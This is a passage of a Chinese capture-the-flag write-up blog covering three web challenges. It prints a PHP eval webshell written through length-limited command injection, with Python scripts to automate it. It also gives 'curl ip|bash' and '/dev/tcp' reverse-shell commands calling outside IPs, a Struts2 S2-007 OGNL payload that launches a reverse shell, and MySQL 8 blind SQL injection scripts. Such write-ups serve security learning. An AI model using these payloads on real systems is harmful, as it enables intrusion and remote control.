<div class="hljs-button {2} add_def" data-title="复制"></div></code><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153);">1</li><li style="color: rgb(153, 153, 153);">2</li><li style="color: rgb(153, 153, 153);">3</li></ul><button class="btn-code-notes mdeditor" data-report-click="{&quot;spm&quot;:&quot;3001.10436&quot;,&quot;extra&quot;:{&quot;index&quot;:20,&quot;runIdx&quot;:-1}}">代码解读</button></pre> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/177a297661cf6ee557ac127bcabda888.png" alt="image-20240907052348379"></p> 
<p>讲清楚原理后开始做题。</p> 
<p><code>pwd</code>查看当前可写入的目录</p> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/6b794580e537d8a8cfafde2f449bd9a8.png" alt="image-20240907083223831"></p> 
<pre data-index="21" class="set-code-show prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">#写入语句
&lt;?php eval($_GET[1]);

#base64编码后
PD9waHAgZXZhbCgkX0dFVFsxXSk7

#需要被执行的语句：
echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php
<div class="hljs-button {2} add_def" data-title="复制"></div></code><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153);">1</li><li style="color: rgb(153, 153, 153);">2</li><li style="color: rgb(153, 153, 153);">3</li><li style="color: rgb(153, 153, 153);">4</li><li style="color: rgb(153, 153, 153);">5</li><li style="color: rgb(153, 153, 153);">6</li><li style="color: rgb(153, 153, 153);">7</li><li style="color: rgb(153, 153, 153);">8</li></ul><button class="btn-code-notes mdeditor" data-report-click="{&quot;spm&quot;:&quot;3001.10436&quot;,&quot;extra&quot;:{&quot;index&quot;:21,&quot;runIdx&quot;:-1}}">代码解读</button></pre> 
<p>依次输入：</p> 
<pre data-index="22" class="set-code-hide prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">&gt;hp
&gt;1.p\\
&gt;d\&gt;\\
&gt;\ -\\
&gt;e64\\
&gt;bas\\
&gt;7\|\\
&gt;XSk\\
&gt;Fsx\\
&gt;dFV\\
&gt;kX0\\
&gt;bCg\\
&gt;XZh\\
&gt;AgZ\\
&gt;waH\\
&gt;PD9\\
&gt;o\ \\
&gt;ech\\
ls -t&gt;0
nl 0
sh 0
<div class="hljs-button {2} add_def" data-title="复制"></div></code><div class="hide-preCode-box"><span class="hide-preCode-bt" data-report-view="{&quot;spm&quot;:&quot;1001.2101.3001.7365&quot;}"><img class="look-more-preCode contentImg-no-view" src="https://csdnimg.cn/release/blogv2/dist/pc/img/newCodeMoreBlack.png" alt="" title=""></span></div><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153);">1</li><li style="color: rgb(153, 153, 153);">2</li><li style="color: rgb(153, 153, 153);">3</li><li style="color: rgb(153, 153, 153);">4</li><li style="color: rgb(153, 153, 153);">5</li><li style="color: rgb(153, 153, 153);">6</li><li style="color: rgb(153, 153, 153);">7</li><li style="color: rgb(153, 153, 153);">8</li><li style="color: rgb(153, 153, 153);">9</li><li style="color: rgb(153, 153, 153);">10</li><li style="color: rgb(153, 153, 153);">11</li><li style="color: rgb(153, 153, 153);">12</li><li style="color: rgb(153, 153, 153);">13</li><li style="color: rgb(153, 153, 153);">14</li><li style="color: rgb(153, 153, 153);">15</li><li style="color: rgb(153, 153, 153);">16</li><li style="color: rgb(153, 153, 153);">17</li><li style="color: rgb(153, 153, 153);">18</li><li style="color: rgb(153, 153, 153);">19</li><li style="color: rgb(153, 153, 153);">20</li><li style="color: rgb(153, 153, 153);">21</li></ul><button class="btn-code-notes mdeditor" data-report-click="{&quot;spm&quot;:&quot;3001.10436&quot;,&quot;extra&quot;:{&quot;index&quot;:22,&quot;runIdx&quot;:-1}}">代码解读</button></pre> 
<p>或者：</p> 
<pre data-index="23" class="set-code-hide prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">&gt;dir
&gt;f\&gt;
&gt;ht-
&gt;sl
*&gt;v
&gt;rev
*v&gt;0
&gt;a
&gt;hp
&gt;p\\
&gt;1.\\
&gt;\&gt;\\
&gt;-d\\
&gt;\ \\
&gt;64\\
&gt;se\\
&gt;ba\\
&gt;\|\\
&gt;7\\
&gt;Sk\\
&gt;X\\
&gt;x\\
&gt;Fs\\
&gt;FV\\
&gt;d\\
&gt;X0\\
&gt;k\\
&gt;g\\
&gt;bC\\
&gt;h\\
&gt;XZ\\
&gt;gZ\\
&gt;A\\
&gt;aH\\
&gt;w\\
&gt;D9\\
&gt;P\\
&gt;S}\\
&gt;IF\\
&gt;{\\
&gt;\$\\
&gt;o\\
&gt;ch\\
&gt;e\\
sh 0
sh f            
<div class="hljs-button {2} add_def" data-title="复制"></div></code><div class="hide-preCode-box"><span class="hide-preCode-bt" data-report-view="{&quot;spm&quot;:&quot;1001.2101.3001.7365&quot;}"><img class="look-more-preCode contentImg-no-view" src="https://csdnimg.cn/release/blogv2/dist/pc/img/newCodeMoreBlack.png" alt="" title=""></span></div><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153);">1</li><li style="color: rgb(153, 153, 153);">2</li><li style="color: rgb(153, 153, 153);">3</li><li style="color: rgb(153, 153, 153);">4</li><li style="color: rgb(153, 153, 153);">5</li><li style="color: rgb(153, 153, 153);">6</li><li style="color: rgb(153, 153, 153);">7</li><li style="color: rgb(153, 153, 153);">8</li><li style="color: rgb(153, 153, 153);">9</li><li style="color: rgb(153, 153, 153);">10</li><li style="color: rgb(153, 153, 153);">11</li><li style="color: rgb(153, 153, 153);">12</li><li style="color: rgb(153, 153, 153);">13</li><li style="color: rgb(153, 153, 153);">14</li><li style="color: rgb(153, 153, 153);">15</li><li style="color: rgb(153, 153, 153);">16</li><li style="color: rgb(153, 153, 153);">17</li><li style="color: rgb(153, 153, 153);">18</li><li style="color: rgb(153, 153, 153);">19</li><li style="color: rgb(153, 153, 153);">20</li><li style="color: rgb(153, 153, 153);">21</li><li style="color: rgb(153, 153, 153);">22</li><li style="color: rgb(153, 153, 153);">23</li><li style="color: rgb(153, 153, 153);">24</li><li style="color: rgb(153, 153, 153);">25</li><li style="color: rgb(153, 153, 153);">26</li><li style="color: rgb(153, 153, 153);">27</li><li style="color: rgb(153, 153, 153);">28</li><li style="color: rgb(153, 153, 153);">29</li><li style="color: rgb(153, 153, 153);">30</li><li style="color: rgb(153, 153, 153);">31</li><li style="color: rgb(153, 153, 153);">32</li><li style="color: rgb(153, 153, 153);">33</li><li style="color: rgb(153, 153, 153);">34</li><li style="color: rgb(153, 153, 153);">35</li><li style="color: rgb(153, 153, 153);">36</li><li style="color: rgb(153, 153, 153);">37</li><li style="color: rgb(153, 153, 153);">38</li><li style="color: rgb(153, 153, 153);">39</li><li style="color: rgb(153, 153, 153);">40</li><li style="color: rgb(153, 153, 153);">41</li><li style="color: rgb(153, 153, 153);">42</li><li style="color: rgb(153, 153, 153);">43</li><li style="color: rgb(153, 153, 153);">44</li><li style="color: rgb(153, 153, 153);">45</li><li style="color: rgb(153, 153, 153);">46</li></ul><button class="btn-code-notes mdeditor" data-report-click="{&quot;spm&quot;:&quot;3001.10436&quot;,&quot;extra&quot;:{&quot;index&quot;:23,&quot;runIdx&quot;:-1}}">代码解读</button></pre> 
<p>脚本：</p> 
<pre data-index="24" class="set-code-hide prettyprint"><code class="prism language-python has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;"><span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"http://152.136.11.155:10109/?6={0}"</span>
cookies <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span><span class="token string">"PHPSESSID"</span><span class="token punctuation">:</span> <span class="token string">"1be0406b25e76622ec8aece860d13e82"</span><span class="token punctuation">}</span>  <span class="token comment"># 添加PHPSESSID cookie</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Start attack!!!"</span><span class="token punctuation">)</span>
<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"results.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> f<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] "</span> <span class="token operator">+</span> url<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">)</span>  <span class="token comment"># 传入cookies</span>

<span class="token comment"># 检查是否攻击成功</span>
test <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"http://152.136.11.155:10109/sandbox/85323d93cc57664e7b283ecce923a707/1.php"</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">)</span>  <span class="token comment"># 传入cookies</span>
<span class="token keyword">if</span> test<span class="token punctuation">.</span>status_code <span class="token operator">==</span> requests<span class="token punctuation">.</span>codes<span class="token punctuation">.</span>ok<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] Attack success!!!"</span><span class="token punctuation">)</span>

<div class="hljs-button {2} add_def" data-title="复制"></div></code><div class="hide-preCode-box"><span class="hide-preCode-bt" data-report-view="{&quot;spm&quot;:&quot;1001.2101.3001.7365&quot;}"><img class="look-more-preCode contentImg-no-view" src="https://csdnimg.cn/release/blogv2/dist/pc/img/newCodeMoreBlack.png" alt="" title=""></span></div><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153);">1</li><li style="color: rgb(153, 153, 153);">2</li><li style="color: rgb(153, 153, 153);">3</li><li style="color: rgb(153, 153, 153);">4</li><li style="color: rgb(153, 153, 153);">5</li><li style="color: rgb(153, 153, 153);">6</li><li style="color: rgb(153, 153, 153);">7</li><li style="color: rgb(153, 153, 153);">8</li><li style="color: rgb(153, 153, 153);">9</li><li style="color: rgb(153, 153, 153);">10</li><li style="color: rgb(153, 153, 153);">11</li><li style="color: rgb(153, 153, 153);">12</li><li style="color: rgb(153, 153, 153);">13</li><li style="color: rgb(153, 153, 153);">14</li><li style="color: rgb(153, 153, 153);">15</li><li style="color: rgb(153, 153, 153);">16</li></ul><button class="btn-code-notes mdeditor" data-report-click="{&quot;spm&quot;:&quot;3001.10436&quot;,&quot;extra&quot;:{&quot;index&quot;:24,&quot;runIdx&quot;:-1}}">代码解读</button></pre> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/adc156ff3e99f7b8bb5c0293cac1307f.png" alt="image-20240907083428462"></p> 
<p>访问<code>/sandbox/85323d93cc57664e7b283ecce923a707/1.php?1=system('ls /');</code>getshell</p> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/d3658b80632baca317652a3281327885.png" alt="image-20240907083658945"></p> 
<hr> 
<p>结尾再放一下其他的payload：</p> 
<p>空格需要转义</p> 
<pre data-index="25" class="set-code-show prettyprint"><code class="prism language-plain has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">&gt;\ \\
<div class="hljs-button {2} add_def" data-title="复制"></div></code><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153);">1</li></ul><button class="btn-code-notes mdeditor" data-report-click="{&quot;spm&quot;:&quot;3001.10436&quot;,&quot;extra&quot;:{&quot;index&quot;:25,&quot;runIdx&quot;:-1}}">代码解读</button></pre> 
<p>构造空格就用去了五个字符，反弹shell语句里面有两个空格，而相同的文件名只能有一个，因此这里不能直接执行bash反弹shell<br> 那么通过将反弹语句放在vps上，然后通过如下方式来执行：</p> 
<pre data-index="26" class="set-code-show prettyprint"><code class="prism language-plain has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">curl ip地址|bash
<div class="hljs-button {2} add_def" data-title="复制"></div></code><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153);">1</li></ul><button class="btn-code-notes mdeditor" data-report-click="{&quot;spm&quot;:&quot;3001.10436&quot;,&quot;extra&quot;:{&quot;index&quot;:26,&quot;runIdx&quot;:-1}}">代码解读</button></pre> 
<p>我们先在自己的vps新建一个文件，内容为</p> 
<pre data-index="27" class="set-code-show prettyprint"><code class="prism language-plain has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">bash -i &gt;&amp; /dev/tcp/124.71.147.99/1717 0&gt;&amp;1
<div class="hljs-button {2} add_def" data-title="复制"></div></code><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153);">1</li></ul><button class="btn-code-notes mdeditor" data-report-click="{&quot;spm&quot;:&quot;3001.10436&quot;,&quot;extra&quot;:{&quot;index&quot;:27,&quot;runIdx&quot;:-1}}">代码解读</button></pre> 
<p>因为<code>ls -t&gt;_</code>的长度也大于5，所以要要把<code>ls -t&gt;y</code>写入文件</p> 
<p>ls命令排序的规则是空格和符号最前，数字其次，字母最后</p> 
<p>参考以下脚本写法：</p> 
<pre data-index="28" class="set-code-hide prettyprint"><code class="prism language-python has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;"><span class="token comment">#encoding:utf-8</span>
<span class="token keyword">import</span> requests
baseurl <span class="token operator">=</span> <span class="token string">"http://120.79.33.253:9003/?cmd="</span>

s <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment"># 将ls -t 写入文件_</span>
<span class="token builtin">list</span><span class="token operator">=</span><span class="token punctuation">[</span>
    <span class="token string">"&gt;ls\\"</span><span class="token punctuation">,</span>
    <span class="token string">"ls&gt;_"</span><span class="token punctuation">,</span>
    <span class="token string">"&gt;\ \\"</span><span class="token punctuation">,</span>
    <span class="token string">"&gt;-t\\"</span><span class="token punctuation">,</span>
    <span class="token string">"&gt;\&gt;y"</span><span class="token punctuation">,</span>
    <span class="token string">"ls&gt;&gt;_"</span>
<span class="token punctuation">]</span>
<span class="token comment"># curl 120.79.33.253|bash</span>
list2<span class="token operator">=</span><span class="token punctuation">[</span>
    <span class="token string">"&gt;bash"</span><span class="token punctuation">,</span>
    <span class="token string">"&gt;\|\\"</span><span class="token punctuation">,</span>
    <span class="token string">"&gt;53\\"</span><span class="token punctuation">,</span>
    <span class="token string">"&gt;2\\"</span><span class="token punctuation">,</span>
    <span class="token string">"&gt;3.\\"</span><span class="token punctuation">,</span>
    <span class="token string">"&gt;3\\"</span><span class="token punctuation">,</span>
    <span class="token string">"&gt;9.\\"</span><span class="token punctuation">,</span>
    <span class="token string">"&gt;7\\"</span><span class="token punctuation">,</span>
    <span class="token string">"&gt;0.\\"</span><span class="token punctuation">,</span>
    <span class="token string">"&gt;12\\"</span><span class="token punctuation">,</span>
    <span class="token string">"&gt;\ \\"</span><span class="token punctuation">,</span>
    <span class="token string">"&gt;rl\\"</span><span class="token punctuation">,</span>
    <span class="token string">"&gt;cu\\"</span>
<span class="token punctuation">]</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">list</span><span class="token punctuation">:</span>
    url <span class="token operator">=</span> baseurl<span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
<span class="token keyword">for</span> j <span class="token keyword">in</span> list2<span class="token punctuation">:</span>
    url <span class="token operator">=</span> baseurl<span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>baseurl<span class="token operator">+</span><span class="token string">"sh _"</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>baseurl<span class="token operator">+</span><span class="token string">"sh y"</span><span class="token punctuation">)</span>


<div class="hljs-button {2} add_def" data-title="复制"></div></code><div class="hide-preCode-box"><span class="hide-preCode-bt" data-report-view="{&quot;spm&quot;:&quot;1001.2101.3001.7365&quot;}"><img class="look-more-preCode contentImg-no-view" src="https://csdnimg.cn/release/blogv2/dist/pc/img/newCodeMoreBlack.png" alt="" title=""></span></div><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153);">1</li><li style="color: rgb(153, 153, 153);">2</li><li style="color: rgb(153, 153, 153);">3</li><li style="color: rgb(153, 153, 153);">4</li><li style="color: rgb(153, 153, 153);">5</li><li style="color: rgb(153, 153, 153);">6</li><li style="color: rgb(153, 153, 153);">7</li><li style="color: rgb(153, 153, 153);">8</li><li style="color: rgb(153, 153, 153);">9</li><li style="color: rgb(153, 153, 153);">10</li><li style="color: rgb(153, 153, 153);">11</li><li style="color: rgb(153, 153, 153);">12</li><li style="color: rgb(153, 153, 153);">13</li><li style="color: rgb(153, 153, 153);">14</li><li style="color: rgb(153, 153, 153);">15</li><li style="color: rgb(153, 153, 153);">16</li><li style="color: rgb(153, 153, 153);">17</li><li style="color: rgb(153, 153, 153);">18</li><li style="color: rgb(153, 153, 153);">19</li><li style="color: rgb(153, 153, 153);">20</li><li style="color: rgb(153, 153, 153);">21</li><li style="color: rgb(153, 153, 153);">22</li><li style="color: rgb(153, 153, 153);">23</li><li style="color: rgb(153, 153, 153);">24</li><li style="color: rgb(153, 153, 153);">25</li><li style="color: rgb(153, 153, 153);">26</li><li style="color: rgb(153, 153, 153);">27</li><li style="color: rgb(153, 153, 153);">28</li><li style="color: rgb(153, 153, 153);">29</li><li style="color: rgb(153, 153, 153);">30</li><li style="color: rgb(153, 153, 153);">31</li><li style="color: rgb(153, 153, 153);">32</li><li style="color: rgb(153, 153, 153);">33</li><li style="color: rgb(153, 153, 153);">34</li><li style="color: rgb(153, 153, 153);">35</li><li style="color: rgb(153, 153, 153);">36</li><li style="color: rgb(153, 153, 153);">37</li><li style="color: rgb(153, 153, 153);">38</li><li style="color: rgb(153, 153, 153);">39</li><li style="color: rgb(153, 153, 153);">40</li><li style="color: rgb(153, 153, 153);">41</li></ul><button class="btn-code-notes mdeditor" data-report-click="{&quot;spm&quot;:&quot;3001.10436&quot;,&quot;extra&quot;:{&quot;index&quot;:28,&quot;runIdx&quot;:-1}}">代码解读</button></pre> 
<h2><a name="t9"></a><a id="Tomcatcat_733"></a><span class="words-blog hl-git-1" data-report-view="{&quot;spm&quot;:&quot;1001.2101.3001.10283&quot;,&quot;extra&quot;:&quot;{\&quot;words\&quot;:\&quot;Tomcat\&quot;}&quot;}" data-tit="Tomcat" data-pretit="tomcat">Tomcat</span>?cat~</h2> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/489f2eb96470a95170e683ae136f816c.png" alt="image-20240808163119493"></p> 
<p>估计是java题，开题</p> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/18f8b06996a1ee8b3e85064a447b713f.png" alt="image-20240808163725093"></p> 
<p>源码发现是struts2的漏洞</p> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/1a583f8b74c2ac692691739f14c0f378.png" alt="image-20240808163735927"></p> 
<p>结合登录框特征，应该是S2-007，在age处注入Payload</p> 
<pre data-index="29" class="set-code-show prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">/user.action
POST:
name=&amp;email=&amp;age=%27+%2B+%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew+java.lang.Boolean%28%22false%22%29+%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27bash%20-c%20%7Becho%2CYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMjQuNzEuMTQ3Ljk5LzE3MTcgMD4mMQ%3D%3D%7D%7C%7Bbase64%2C-d%7D%7C%7Bbash%2C-i%7D%27%29.getInputStream%28%29%29%29+%2B+%27
<div class="hljs-button {2} add_def" data-title="复制"></div></code><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153);">1</li><li style="color: rgb(153, 153, 153);">2</li><li style="color: rgb(153, 153, 153);">3</li></ul><button class="btn-code-notes mdeditor" data-report-click="{&quot;spm&quot;:&quot;3001.10436&quot;,&quot;extra&quot;:{&quot;index&quot;:29,&quot;runIdx&quot;:-1}}">代码解读</button></pre> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/94c020f7468f881547de71648ee80d92.png" alt="image-20240808170218583"></p> 
<p>flag在<code>/usr/local/tomcat/webapps/flaaaaaaag/flag.jsp</code></p> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/29c2a0be459d4c2f70fc9d6d264df87d.png" alt="image-20240808183610511"></p> 
<h2><a name="t10"></a><a id="newsql_785"></a>newsql</h2> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/381a019d842c9338717ed4e364736f19.png" alt="image-20240807211514411"></p> 
<p>开题，id应该是注入点了</p> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/da5e72e261902508c1d20638c16109b9.png" alt="image-20240808205920451"></p> 
<p>存在过滤</p> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/08aa7892be36c51be31985a28d5debba.png" alt="image-20240808210016736"></p> 
<p>模糊测试测一下，响应大小为7的都是被过滤的</p> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/8356401b194fd3327aaa53be335c55c7.png" alt="image-20240808210230581"></p> 
<p>过滤如下</p> 
<pre data-index="30" class="set-code-show prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">;
select
union
where
order
having
<div class="hljs-button {2} add_def" data-title="复制"></div></code><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153);">1</li><li style="color: rgb(153, 153, 153);">2</li><li style="color: rgb(153, 153, 153);">3</li><li style="color: rgb(153, 153, 153);">4</li><li style="color: rgb(153, 153, 153);">5</li><li style="color: rgb(153, 153, 153);">6</li></ul><button class="btn-code-notes mdeditor" data-report-click="{&quot;spm&quot;:&quot;3001.10436&quot;,&quot;extra&quot;:{&quot;index&quot;:30,&quot;runIdx&quot;:-1}}">代码解读</button></pre> 
<p>闭合为空，数字型</p> 
<pre data-index="31" class="set-code-show prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">/?id=1 and 1=1--+
/?id=1 and 1=2--+
<div class="hljs-button {2} add_def" data-title="复制"></div></code><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153);">1</li><li style="color: rgb(153, 153, 153);">2</li></ul><button class="btn-code-notes mdeditor" data-report-click="{&quot;spm&quot;:&quot;3001.10436&quot;,&quot;extra&quot;:{&quot;index&quot;:31,&quot;runIdx&quot;:-1}}">代码解读</button></pre> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/a26f7fb2801e5fff5e48012e463ed45d.png" alt="image-20240808214146728"></p> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/65b54f16b447abd435cb77d0e5acaddb.png" alt="image-20240808214157558"></p> 
<p>MYSQL8.0新特性注入</p> 
<blockquote> 
 <p><a href="https://blog.csdn.net/rfrder/article/details/118726022">Pwnhub2021七月赛NewSql（mysql8注入）_mysql8.0新特性注入ctf-CSDN博客</a></p> 
 <p><a href="https://xz.aliyun.com/t/8646?time__1311=n4%2BxnD0DcDu70%3D3ex05%2BbzDOWDkmNQY1k74D" rel="nofollow">MYSQL8.0注入新特性 - 先知社区 (aliyun.com)</a></p> 
 <p><a href="https://blog.csdn.net/HBohan/article/details/119757059">【网安干货】MySQL8新特性注入技巧_mysql8.0.19还是8.0.21-CSDN博客</a></p> 
</blockquote> 
<p>先手动盲注一下，可行</p> 
<pre data-index="32" class="set-code-show prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">?id=1 and substr((database()),1,4)='cnss'
?id=1 and ((binary'mysqk','')&lt;(table/**/information_schema.TABLESPACES_EXTENSIONS/**/limit/**/0,1))#
<div class="hljs-button {2} add_def" data-title="复制"></div></code><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153);">1</li><li style="color: rgb(153, 153, 153);">2</li></ul><button class="btn-code-notes mdeditor" data-report-click="{&quot;spm&quot;:&quot;3001.10436&quot;,&quot;extra&quot;:{&quot;index&quot;:32,&quot;runIdx&quot;:-1}}">代码解读</button></pre> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/75710b3041378af02cc896d2e5e84f19.png" alt="image-20240907085937841"></p> 
<p><img src="https://img-blog.csdnimg.cn/img_convert/3a8559ed80e6a960ccd8c03ca773660c.png" alt="image-20240907091129254"></p> 
<p>写个<a href="https://so.csdn.net/so/search?q=%E8%87%AA%E5%8A%A8%E5%8C%96%E8%84%9A%E6%9C%AC&amp;spm=1001.2101.3001.7020" target="_blank" class="hl hl-1" data-report-view="{&quot;spm&quot;:&quot;1001.2101.3001.7020&quot;,&quot;dest&quot;:&quot;https://so.csdn.net/so/search?q=%E8%87%AA%E5%8A%A8%E5%8C%96%E8%84%9A%E6%9C%AC&amp;spm=1001.2101.3001.7020&quot;,&quot;extra&quot;:&quot;{\&quot;searchword\&quot;:\&quot;自动化脚本\&quot;}&quot;}" data-report-click="{&quot;spm&quot;:&quot;1001.2101.3001.7020&quot;,&quot;dest&quot;:&quot;https://so.csdn.net/so/search?q=%E8%87%AA%E5%8A%A8%E5%8C%96%E8%84%9A%E6%9C%AC&amp;spm=1001.2101.3001.7020&quot;,&quot;extra&quot;:&quot;{\&quot;searchword\&quot;:\&quot;自动化脚本\&quot;}&quot;}" data-tit="自动化脚本" data-pretit="自动化脚本">自动化脚本</a>：（没写完）</p> 
<pre data-index="33" class="set-code-hide prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">import requests

url="http://152.136.11.155:10111"

flag=""
for i in range(100):
    for j in "!#$%&amp;()*+,-/0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~":
        # payload = "1 and ((binary'{}','')&lt;(table information_schema.TABLESPACES_EXTENSIONS limit 7,1))#".format(flag+j)

        payload = "1 and (('def','cnss','{}',0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0)&lt;(table information_schema.tables limit 8,1))#".format(flag+j)
        # payload = "1 and if(('def','cnss','{}',0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0)&lt;(TABLE information_schema.tables limit {},1),0,1)"
        # payload = "1 and ('def','cnss','cn55','{}',0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0)&lt;(TABLE cn55 limit {},1)".format(flag+j,i)

        # payload = "1 and (('1',binary'{}')&lt;(table cnss.cn55 limit 0,1))#".format(flag+j)



        data={
            'id':payload
        }
        # r = requests.post(url=url, data=data)
        r = requests.get(url=url, params=data)

        # print(payload)
        # print(flag+j)
        # print(len(r.text))
        # print(r.text)

        if len(r.text) == 102:
            flag += chr(ord(j)-1)
            print(flag)
            break
        if j == "~":
            flag = flag[:len(flag)-1]+chr(ord(flag[-1])+1)
            print(flag)
            exit()


#库/表：mysql,innodb_system,innodb_temporary,innodb_undo_001,innodb_undo_002,sys/sys_config,cnss/users,cnss/cn55,cnss/uagents,cnss/referers
<div class="hljs-button {2} add_def" data-title="复制"></div></code><div class="hide-preCode-box"><span class="hide-preCode-bt" data-report-view="{&quot;spm&quot;:&quot;1001.2101.3001.7365&quot;}"><img class="look-more-preCode contentImg-no-view" src="https://csdnimg.cn/release/blogv2/dist/pc/img/newCodeMoreBlack.png" alt="" title=""></span></div><ul class="pre-numbering" style=""><li style="color: rgb(153, 153, 153);">1</li><li style="color: rgb(153, 153, 153);">2</li><li style="color: rgb(153, 153, 153);">3</li><li style="color: rgb(153, 153, 153);">4</li><li style="color: rgb(153, 153, 153);">5</li><li style="color: rgb(153, 153, 153);">6</li><li style="color: rgb(153, 153, 153);">7</li><li style="color: rgb(153, 153, 153);">8</li><li style="color: rgb(153, 153, 153);">9</li><li style="color: rgb(153, 153, 153);">10</li><li style="color: rgb(153, 153, 153);">11</li><li style="color: rgb(153, 153, 153);">12</li><li style="color: rgb(153, 153, 153);">13</li><li style="color: rgb(153, 153, 153);">14</li><li style="color: rgb(153, 153, 153);">15</li><li style="color: rgb(153, 153, 153);">16</li><li style="color: rgb(153, 153, 153);">17</li><li style="color: rgb(153, 153, 153);">18</li><li style="color: rgb(153, 153, 153);">19</li><li style="color: rgb(153, 153, 153);">20</li><li style="color: rgb(153, 153, 153);">21</li><li style="color: rgb(153, 153, 153);">22</li><li style="color: rgb(153, 153, 153);">23</li><li style="color: rgb(153, 153, 153);">24</li><li style="color: rgb(153, 153, 153);">25</li><li style="color: rgb(153, 153, 153);">26</li><li style="color: rgb(153, 153, 153);">27</li><li style="color: rgb(153, 153, 153);">28</li><li style="color: rgb(153, 153, 153);">29</li><li style="color: rgb(153, 153, 153);">30</li><li style="color: rgb(153, 153, 153);">31</li><li style="color: rgb(153, 153, 153);">32</li><li style="color: rgb(153, 153, 153);">33</li><li style="color: rgb(153, 153, 153);">34</li><li style="color: rgb(153, 153, 153);">35</li><li style="color: rgb(153, 153, 153);">36</li><li style="color: rgb(153, 153, 153);">37</li><li style="color: rgb(153, 153, 153);">38</li><li style="color: rgb(153, 153, 153);">39</li></ul><button class="btn-code-notes mdeditor" 